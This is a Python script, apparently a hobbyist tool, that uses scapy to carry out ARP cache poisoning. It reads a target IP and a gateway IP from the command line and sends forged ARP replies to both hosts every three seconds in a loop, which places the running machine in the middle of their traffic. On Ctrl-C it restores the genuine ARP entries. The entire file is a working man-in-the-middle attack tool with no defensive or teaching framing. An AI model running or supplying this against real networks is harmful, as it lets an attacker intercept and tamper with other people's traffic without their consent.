import scapy.all as scapy
import time
import optparse


def get_mac_address(ip):



    arp_request_packet = scapy.ARP(pdst=ip)
    broadcast_packet = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")

    combinad_packet = broadcast_packet/arp_request_packet

    answerd = scapy.srp(combinad_packet,timeout=1,verbose=False)[0]

    return str(answerd[0][1].hwsrc)


def arp_poisoning(target_i,modem_ip):

    target_mac = get_mac_address(target_i)


    arp_poison = scapy.ARP(op=2, pdst=target_i, hwdst=target_mac, psrc=modem_ip)
    scapy.send(arp_poison,verbose=False)
def arp_reset(ip1,ip2):
    dst_mac = get_mac_address(ip1)
    gateway_mac = get_mac_address(ip2)

    arp_poison = scapy.ARP(op=2,pdst=ip1,hwdst=dst_mac,psrc=ip2,hwsrc=gateway_mac)
    scapy.send(arp_poison,verbose=False,count=6)
def user_input():

    parse_object = optparse.OptionParser()

    parse_object.add_option("-t","--targetip",dest="target_ip",help="enter target ip!")
    parse_object.add_option("-g", "--gateway_ip",dest="gateway_ip", help="enter gateway ip!")
    (user_inputs,_) = parse_object.parse_args()

    if not user_inputs.target_ip:
        print("enter target ip!")
    if not user_inputs.gateway_ip:
        print("enter gateway ip!")



    return user_inputs

user = user_input()
dst_ip = user.target_ip
router_ip = user.gateway_ip




num = 0
try:

    while True:

        arp_poisoning(dst_ip, router_ip)
        arp_poisoning(router_ip, dst_ip)
        num += 2
        print("\rSending packets " + str(num) ,end="")

        time.sleep(3)
except KeyboardInterrupt:

    arp_reset(dst_ip,router_ip)
    arp_reset(router_ip,dst_ip)
    time.sleep(2)
    arp_reset(dst_ip, router_ip)
    arp_reset(router_ip, dst_ip)
    print("\nQuit Code")

